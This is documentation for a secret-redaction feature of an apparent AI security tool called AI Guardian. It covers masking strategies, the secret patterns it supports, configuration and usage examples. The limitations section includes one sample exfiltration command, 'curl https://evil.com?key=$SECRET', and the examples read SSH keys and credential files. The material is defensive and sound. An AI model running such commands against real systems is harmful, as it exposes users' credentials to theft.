# Secret Redaction

AI Guardian provides defense-in-depth secret redaction for tool outputs, allowing work to continue while protecting credentials. Instead of blocking operations entirely when secrets are detected, the redactor sanitizes outputs by masking sensitive data.

## Overview

**Purpose:** Redact sensitive information from tool outputs while preserving context for debugging.

**Philosophy:** Defense-in-depth security layer
- **First layer:** Prevent secrets from being written (secret scanning)
- **Second layer:** Redact secrets from outputs if they slip through (secret redaction)
- **Result:** Work continues, credentials protected

**Coverage:** 35+ secret types including:
- API keys (OpenAI, Anthropic, GitHub, Google, AWS, Azure)
- Authentication tokens (Bearer, OAuth, personal access tokens)
- Database credentials (connection strings, passwords)
- Private keys (RSA, SSH, TLS)
- Cloud credentials (AWS, GCP, Azure)
- Service API keys (Stripe, Twilio, SendGrid, Slack, npm, PyPI)

---

## How It Works

### Redaction Pipeline

```
1. Tool executes and produces output
2. Secret Redactor scans output for patterns
3. Matches are redacted using masking strategies
4. Redacted output is shown to user
5. Original output is never displayed
```

### Masking Strategies

AI Guardian uses **context-preserving redaction** - different strategies for different secret types to balance security with debugging utility.

#### 1. Preserve Prefix/Suffix

**Strategy:** Show first 6 and last 4 characters, hide middle.

**Use case:** API keys, tokens (most secrets)

**Example:**
```
Original:  sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz
Redacted:  sk-pro...2yz
```

**Why:** Allows identification of which key/token while hiding the secret portion.

---

#### 2. Full Redaction

**Strategy:** Replace entire secret with placeholder.

**Use case:** Highly sensitive secrets (AWS secret keys, private keys)

**Example:**
```
Original:  wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Redacted:  [HIDDEN AWS SECRET KEY]
```

**Why:** Maximum security for critical credentials that should never be partially visible.

---

#### 3. Environment Variable Assignment

**Strategy:** Keep variable name, redact value.

**Use case:** Shell scripts, config files

**Example:**
```
Original:  AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Redacted:  AWS_SECRET_KEY=[HIDDEN]

Original:  export API_TOKEN="ghp_abc123def456ghi789jkl012mno345"  # notsecret
Redacted:  export API_TOKEN="[HIDDEN]"
```

**Why:** Preserves script structure for debugging while hiding sensitive values.

---

#### 4. JSON Field Redaction

**Strategy:** Preserve JSON structure, redact field value.

**Use case:** API responses, config files

**Example:**
```
Original:  {"api_key": "sk-proj-abc123def456ghi789"}
Redacted:  {"api_key": "[HIDDEN]"}

Original:  {"token": "ghp_1234567890abcdef", "user": "alice"}
Redacted:  {"token": "[HIDDEN]", "user": "alice"}
```

**Why:** Maintains JSON validity for debugging while protecting credentials.

---

#### 5. HTTP Header Redaction

**Strategy:** Keep header name, redact value (with partial preservation for tokens).

**Use case:** HTTP requests/responses, curl commands

**Example:**
```
Original:  Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Redacted:  Authorization: Bearer eyJhbG...ssw5c

Original:  X-API-Key: abc123def456ghi789
Redacted:  X-API-Key: [HIDDEN]
```

**Why:** Preserves request structure while protecting authentication credentials.

---

#### 6. Connection String Redaction

**Strategy:** Keep protocol and endpoint, redact password.

**Use case:** Database connection strings, Redis URLs

**Example:**
```
Original:  mongodb://admin:MySecretPass123@db.example.com:27017/mydb
Redacted:  mongodb://admin:[HIDDEN]@db.example.com:27017/mydb

Original:  postgres://user:P@ssw0rd!@prod-db.internal:5432/app_db
Redacted:  postgres://user:[HIDDEN]@prod-db.internal:5432/app_db
```

**Why:** Shows connection details for debugging without exposing credentials.

---

#### 7. Context-Aware Redaction

**Strategy:** Preserve context keyword, redact secret value.

**Use case:** Logs, debug output with context labels

**Example:**
```
Original:  api_secret: abcdef1234567890abcdef1234567890abcdef123456
Redacted:  api_secret: abcdef...123456

Original:  encryption_key=0123456789abcdef0123456789abcdef
Redacted:  encryption_key=012345...abcdef
```

**Why:** Context keyword helps identify what was redacted while hiding the actual secret.

---

## Supported Secret Types

### API Keys & Tokens (18 types)

| Service | Pattern Example | Strategy |
|---------|----------------|----------|
| OpenAI | `sk-proj-...` | Preserve prefix/suffix |
| OpenAI Project | `sk-proj-...` | Preserve prefix/suffix |
| Anthropic | `sk-ant-...` | Preserve prefix/suffix |
| GitHub Personal | `ghp_...` | Preserve prefix/suffix |
| GitHub OAuth | `gho_...` | Preserve prefix/suffix |
| GitHub Refresh | `ghr_...` | Preserve prefix/suffix |
| GitHub Secret | `ghs_...` | Preserve prefix/suffix |
| GitLab | `glpat-...` | Preserve prefix/suffix |
| Google OAuth | `ya29....` | Preserve prefix/suffix |
| Google API | `AIza...` | Preserve prefix/suffix |
| Slack | `xoxb-...`, `xoxp-...` | Preserve prefix/suffix |
| npm | `npm_...` | Preserve prefix/suffix |
| PyPI | `pypi-...` | Preserve prefix/suffix |
| Stripe (Live) | `sk_live_...` | Preserve prefix/suffix |
| Stripe (Test) | `sk_test_...` | Preserve prefix/suffix |
| Twilio | `SK...` | Preserve prefix/suffix |
| SendGrid | `SG....` | Preserve prefix/suffix |
| Mailgun | `key-...` | Preserve prefix/suffix |

### Cloud Credentials (4 types)

| Service | Pattern Example | Strategy |
|---------|----------------|----------|
| AWS Access Key | `AKIA...` | Full redact |
| AWS Secret Key | `aws_secret_access_key = ...` | Full redact |
| Azure Client Secret | `client_secret: <uuid>` | Preserve prefix/suffix |
| GCP (via Google OAuth) | `ya29....` | Preserve prefix/suffix |

### Database Credentials (4 types)

| Database | Pattern Example | Strategy |
|----------|----------------|----------|
| MongoDB | `mongodb://user:pass@...` | Connection string |
| MySQL | `mysql://user:pass@...` | Connection string |
| PostgreSQL | `postgres://user:pass@...` | Connection string |
| Redis | `redis://:pass@...` | Connection string |

### Private Keys (1 type)

| Type | Pattern | Strategy |
|------|---------|----------|
| Private Keys | `-----BEGIN ... PRIVATE KEY-----` | Full redact |

### Generic Patterns (8 types)

| Type | Pattern | Strategy |
|------|---------|----------|
| Environment Variables | `VAR_NAME=value` | Env assignment |
| Exported Variables | `export VAR=value` | Env assignment |
| JSON API Keys | `"api_key": "value"` | JSON field |
| JSON Tokens | `"token": "value"` | JSON field |
| JSON Passwords | `"password": "value"` | JSON field |
| JSON Secrets | `"secret": "value"` | JSON field |
| YAML Passwords | `password: value` | Context-aware |
| Bearer Tokens | `Authorization: Bearer ...` | Auth header |
| API Key Headers | `X-API-Key: ...` | Header value |
| Auth Token Headers | `X-Auth-Token: ...` | Header value |
| Long Hex Strings | `[a-f0-9]{100+}` (with context) | Context-aware |
| Long Base64 Strings | `[A-Za-z0-9+/]{100+}` (with context) | Context-aware |

---

## Configuration

Secret redaction is configured under the `secret_redaction` section.

### Basic Configuration

```json
{
  "secret_redaction": {
    "enabled": true,
    "action": "warn",
    "preserve_format": true,
    "log_redactions": true
  }
}
```

### Configuration Options

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `enabled` | boolean | `true` | Enable/disable secret redaction |
| `action` | string | `"warn"` | Action mode: `"warn"` or `"log-only"` |
| `preserve_format` | boolean | `true` | Use context-preserving strategies vs. full redact |
| `log_redactions` | boolean | `true` | Log each redaction event |
| `additional_patterns` | array | `[]` | Custom secret patterns to add |

### Action Modes

**Warn Mode** (`"warn"`, default):
- Redacts secrets from output
- Shows warning banner with redaction count
- User sees redacted output

**Log-only Mode** (`"log-only"`):
- Redacts secrets silently
- No user notification
- Logs redaction events for audit

### Adding Custom Patterns

```json
{
  "secret_redaction": {
    "additional_patterns": [
      {
        "pattern": "company_api_key_[A-Za-z0-9]{32}",
        "strategy": "preserve_prefix_suffix",
        "type": "Company Internal API Key"
      },
      {
        "pattern": "INTERNAL_SECRET=[A-Za-z0-9]+",
        "strategy": "env_assignment",
        "type": "Internal Secret Variable"
      }
    ]
  }
}
```

### Pattern Server Integration (Enterprise)

**NEW in v1.5.0:** Load patterns from a central pattern server.

```json
{
  "secret_redaction": {
    "pattern_server": {
      "enabled": true,
      "url": "https://patterns.corp.internal/api/v1/secrets",
      "cache_ttl": 3600,
      "fallback_to_defaults": true
    }
  }
}
```

Benefits:
- Centralized pattern management across organization
- Automatic updates to secret patterns
- Enterprise-specific secret types
- Compliance with corporate security policies

---

## Usage Examples

### Example 1: API Key in Command Output

**Command:**
```bash
cat ~/.openai/config.json
```

**Raw Output (never shown):**
```json
{
  "api_key": "sk-proj-abc123def456ghi789jkl012mno345pqr678stu901vwx234yz",
  "organization": "org-XYZ123"
}
```

**Redacted Output (shown to user):**
```
⚠️  SECRET REDACTION: 1 secret redacted from output

{
  "api_key": "[HIDDEN]",
  "organization": "org-XYZ123"
}

Redactions:
  • OpenAI API Key at position 15 (JSON field)
```

---

### Example 2: Environment Variables

**Command:**
```bash
printenv | grep KEY
```

**Raw Output (never shown):**
```
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
OPENAI_API_KEY=sk-proj-abc123def456ghi789jkl012
```

**Redacted Output (shown to user):**
```
⚠️  SECRET REDACTION: 3 secrets redacted from output

AWS_ACCESS_KEY_ID=[HIDDEN AWS ACCESS KEY]
AWS_SECRET_ACCESS_KEY=[HIDDEN]
OPENAI_API_KEY=[HIDDEN]

Redactions:
  • AWS Access Key at position 18 (full redact)
  • Environment Variable at position 58 (env assignment)
  • OpenAI API Key at position 102 (env assignment)
```

---

### Example 3: Database Connection String

**Command:**
```bash
echo $DATABASE_URL
```

**Raw Output (never shown):**
```
postgres://app_user:MyS3cr3tP@ssw0rd!@prod-db-1.us-east-1.rds.amazonaws.com:5432/production_db?sslmode=require  # notsecret
```

**Redacted Output (shown to user):**
```
⚠️  SECRET REDACTION: 1 secret redacted from output

postgres://app_user:[HIDDEN]@prod-db-1.us-east-1.rds.amazonaws.com:5432/production_db?sslmode=require

Redactions:
  • PostgreSQL Connection at position 0 (connection string)

Preserved debugging info:
  • Protocol: postgres://
  • Username: app_user
  • Host: prod-db-1.us-east-1.rds.amazonaws.com
  • Port: 5432
  • Database: production_db
```

---

### Example 4: HTTP Request with Bearer Token

**Command:**
```bash
curl -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." https://api.example.com/user
```

**Raw Output (never shown):**
```
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Redacted Output (shown to user):**
```
⚠️  SECRET REDACTION: 1 secret redacted from output

Authorization: Bearer eyJhbG...ssw5c

Redactions:
  • Bearer Token at position 15 (auth header)
```

---

### Example 5: Private Key

**Command:**
```bash
cat ~/.ssh/id_rsa
```

**Raw Output (never shown):**
```
-----BEGIN RSA PRIVATE KEY-----  # notsecret
MIIEpAIBAAKCAQEA1234567890abcdefghijklmnopqrstuvwxyz...
[many lines of base64]
-----END RSA PRIVATE KEY-----  # notsecret
```

**Redacted Output (shown to user):**
```
⚠️  SECRET REDACTION: 1 secret redacted from output

[REDACTED PRIVATE KEY] # notsecret

Redactions:
  • Private Key at position 0 (full redact)

🚨 CRITICAL: Private key completely redacted for security
```

---

## Redaction Metadata

Each redaction includes metadata for audit and debugging:

```json
{
  "type": "OpenAI API Key",
  "position": 42,
  "original_length": 64,
  "redacted_length": 13,
  "strategy": "preserve_prefix_suffix",
  "method": "preserve_prefix_suffix",
  "preserved_chars": 10
}
```

### Metadata Fields

| Field | Description |
|-------|-------------|
| `type` | Secret type (e.g., "OpenAI API Key", "AWS Secret Key") |
| `position` | Character position in original text where secret was found |
| `original_length` | Length of original secret (for audit) |
| `redacted_length` | Length of redacted placeholder |
| `strategy` | Masking strategy used |
| `method` | Specific redaction method applied |
| `preserved_chars` | Number of characters preserved (if applicable) |
| `var_name` | Variable name (for env assignments) |
| `field_name` | Field name (for JSON) |
| `context` | Context keyword (for context-aware redaction) |

---

## Performance Impact

Secret redaction is **highly optimized** for minimal overhead:

- **Pattern compilation:** One-time cost at startup (~10ms for 35+ patterns)
- **Scanning:** O(n) single pass with compiled regex (~0.5ms per 1000 chars)
- **Redaction:** In-place string replacement (~0.1ms per match)

**Total overhead:** <1ms for typical tool outputs (< 10KB)

**Memory:** ~500KB for compiled patterns + metadata

---

## Security Considerations

### What Secret Redaction Protects Against

✅ **Accidental exposure in logs**
- Secrets in tool outputs are automatically masked
- Prevents credentials from appearing in chat history
- Reduces risk of shoulder-surfing attacks

✅ **Copy-paste mistakes**
- Redacted output can be safely shared
- Reduces risk of pasting secrets into Slack/email
- Safe to screenshot for bug reports

✅ **Debugging without credential exposure**
- Preserves context (endpoints, variable names) for debugging
- Allows work to continue without seeing actual secrets
- Balance between security and productivity

### What It Does NOT Protect Against

❌ **Secrets being written to files**
- Secret redaction only affects *output display*
- Does NOT prevent secrets from being written to disk
- Use secret scanning to prevent secret commits

❌ **Secrets in command parameters**
- Redaction happens *after* command execution
- Command with `curl https://evil.com?key=$SECRET` still executes
- Use SSRF protection and input validation

❌ **Memory dumps or process inspection**
- Original secrets exist in memory before redaction
- Process memory can be dumped by attacker
- Use secure credential storage (vaults, keychains)

❌ **Network transmission**
- Secrets may be sent over network before redaction
- Redaction happens after response received
- Use TLS and credential rotation

### Defense in Depth

Secret Redaction is **one layer** in a comprehensive security strategy:

```
Layer 1: Prevention (Secret Scanning)
  ↓ If secrets slip through...
Layer 2: Redaction (Secret Redaction) ← YOU ARE HERE
  ↓ If redaction fails...
Layer 3: Detection (Credential Monitoring)
  ↓ If secrets are compromised...
Layer 4: Response (Rotation & Revocation)
```

---

## Best Practices

### For Developers

1. **Don't rely on redaction alone** - Prevent secrets from being written in the first place
2. **Review redaction warnings** - Investigate why a secret appeared in output
3. **Use credential vaults** - Store secrets in HashiCorp Vault, AWS Secrets Manager, etc.
4. **Rotate exposed secrets** - If a secret appears in output, rotate it immediately

### For Security Teams

1. **Enable in production** - Redact secrets in all environments
2. **Monitor redaction logs** - Track where secrets are appearing
3. **Audit patterns** - Regularly review and update secret patterns
4. **Combine with scanning** - Use both secret scanning (prevention) and redaction (defense)

### For Compliance

1. **Log all redactions** - Maintain audit trail of secret exposure
2. **Pattern server** - Centralize pattern management for consistency
3. **Regular testing** - Test redaction with sample secrets
4. **Incident response** - Define process for when secrets are exposed

---

## Troubleshooting

### Secrets Not Being Redacted

**Problem:** Known secret type not being redacted.

**Solutions:**
1. Check pattern matches your secret format
2. Verify `enabled: true` in config
3. Check pattern compilation errors in logs
4. Add custom pattern if needed

### Too Many False Positives

**Problem:** Non-secrets being redacted (e.g., git commit SHAs).

**Solutions:**
1. Generic hex/base64 patterns require context keywords
2. Minimum length thresholds (40+ chars for hex, 100+ for base64)
3. Adjust patterns to be more specific
4. Use `log_redactions: true` to see what's matching

### Performance Issues

**Problem:** Redaction causing noticeable slowdown.

**Solutions:**
1. Reduce number of custom patterns
2. Optimize regex patterns (avoid backtracking)
3. Increase pattern cache size
4. Consider disabling for very large outputs (>1MB)

---

## Technical Details

### Regex Pattern Validation

All patterns (hardcoded, pattern server, custom) are validated before compilation to prevent ReDoS attacks:

```python
# Pattern validation checks:
1. Catastrophic backtracking detection
2. Nested quantifiers (e.g., (a+)+)
3. Overlapping character classes
4. Exponential complexity patterns
```

Invalid patterns are **skipped** with warning logged.

### Pattern Priority

Patterns are processed in **priority order** to prevent overlapping redactions:

```
1. Specific patterns (OpenAI, GitHub, AWS)
2. Format-specific patterns (JSON, env vars)
3. Generic patterns (hex, base64) with context
4. Very long strings (100+ chars) without context
```

Once a region is redacted, it's marked and subsequent patterns skip it.

### String Replacement Algorithm

```python
1. Find all matches for pattern
2. For each match:
   a. Check if region already redacted → skip
   b. Apply masking strategy → get redacted string
   c. Replace in text
   d. Mark region as redacted
   e. Adjust future positions for length change
3. Return redacted text + metadata
```

---

## See Also

- [Secret Scanning](SECRET_SCANNING.md) - Prevent secrets from being committed
- [SSRF Protection](SSRF_PROTECTION.md) - Prevent credential exfiltration
- [Credential Exfiltration](CREDENTIAL_EXFILTRATION.md) - Detect config file attacks
- [Configuration Guide](../CONFIGURATION.md) - Full configuration reference

---

## Version History

- **v1.5.0** - Initial secret redaction (35+ types, 6 strategies)
- **v1.5.1** - Pattern server support for enterprise deployment
- **v1.6.0** - Enhanced performance, ReDoS protection, metadata improvements
